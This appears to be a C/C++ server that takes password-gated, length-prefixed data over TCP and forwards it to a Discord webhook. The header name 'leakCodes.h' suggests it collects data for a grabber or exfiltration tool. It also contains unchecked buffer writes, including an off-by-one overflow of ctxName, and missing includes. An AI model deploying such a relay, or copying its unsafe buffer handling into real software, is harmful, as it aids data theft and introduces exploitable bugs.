#include <linux/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <errno.h>

#include "leakCodes.h"
#include "discordWebhook.h"

#define SOCKET int
#define PTHREAD_FUNCTION void *

SOCKET listenerSock;
volatile bool keepRunning = true;

void cleanup(int dumm) {
    close(listenerSock);
    keepRunning = false;
}

inline bool isInvalid(SOCKET sock) {
    return sock < 0;
}

inline void printErr(const char *message) {
    fwrite(message, 1, strlen(message), stderr);
    fwrite("\n", 1, 1, stderr);
}

int fetchData(SOCKET clientSock, char *dataBuffer, size_t size) {
    int status = 0;

    while (status >= 0 && size > 1200) {
        send(clientSock, (void *)dataBuffer, 1, MSG_NOSIGNAL);
        status = recv(clientSock, (void *)dataBuffer, 1200, 0);
        dataBuffer += status;
        size -= status;
    }

    if (size > 0 && status >= 0) { 
        send(clientSock, (void *)dataBuffer, 1, MSG_NOSIGNAL);
        status = recv(clientSock, (void *)dataBuffer, size, 0);
    }

    return status;
}

PTHREAD_FUNCTION clientHandler(void * args) {
    SOCKET clientSock = (int64_t)args;
    
    size_t initData = 0;

    for (uint8_t i = 20; i; i--) {
        if (recv(clientSock, (void *)&initData, sizeof(size_t), MSG_DONTWAIT) == -1) {
            if (errno != EWOULDBLOCK) {
                initData = 0;
                break;
            }
        } else {
            break;
        }
        usleep(500000);
    }

    if (initData != CCRUNE_PASS) {
        close(clientSock);
        return 0;
    }

    initData = 0;
    if (recv(clientSock, (void *)&initData, sizeof(size_t), 0) == -1 || initData == 0) {
        close(clientSock);
        return 0;
    }

    char *dataBuffer = (char *)new char[initData + 1];
    int status = fetchData(clientSock, dataBuffer, initData);

    if (status >= 0) {
        dataBuffer[initData] = '\0';

        char ctxName[30];

        if (recv(clientSock, (void *)&initData, sizeof(size_t), 0) != -1 && initData != 0) {
            status = recv(clientSock, (void *)ctxName, 30, 0);
            std::cout << ctxName << "\nSize: " << initData << std::endl;

            if (status >= 0) {
                ctxName[status] = '\0';
                char *dataCtx = (char *)new char[initData];

                status = fetchData(clientSock, dataCtx, initData);

                if (status >= 0) {
                    std::string_view fData = std::string_view(dataCtx, initData);

                    webhookSend(dataBuffer, fData, ctxName);
                    close(clientSock);
                    delete[] dataBuffer;
                    delete[] dataCtx;
                    return 0;
                }

                delete[] dataCtx;
            }
        }

        webhookSend(dataBuffer, nullptr, nullptr);
    }

    close(clientSock);
    delete[] dataBuffer;
    return 0;
}

int main() {
    uint8_t exit_code = 0;

    initWebhook();

    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);

    listenerSock = socket(AF_INET, SOCK_STREAM, 0);
    if (isInvalid(listenerSock)) {
        printErr("Creation of Socket Failed: Error 1");
        return 1;
    }

    sockaddr_in bindAddr;
    bindAddr.sin_addr.s_addr = INADDR_ANY;
    bindAddr.sin_family = AF_INET;
    bindAddr.sin_port = htons(CCRUNE_PORT);

    if (bind(listenerSock, (sockaddr *)&bindAddr, sizeof(sockaddr_in))) {
        exit_code = 2;
        printErr("Failed binding Listener Socket: Error 2");
        goto mainCleanup;
    }

    if (listen(listenerSock, 10)) {
        exit_code = 3;
        printErr("Failed to set queue size for Listener Socket: Error 3");
        goto mainCleanup;
    }

    while (keepRunning) {
        SOCKET clientSock = accept(listenerSock, NULL, NULL);
        if (!isInvalid(clientSock)) {
            pthread_t threadHandle;
            int64_t threadArg = clientSock;
            pthread_create(&threadHandle, NULL, clientHandler, (void *)threadArg);
            pthread_detach(threadHandle);
        }
    }

mainCleanup:
    cleanup(0);

    return exit_code;
}
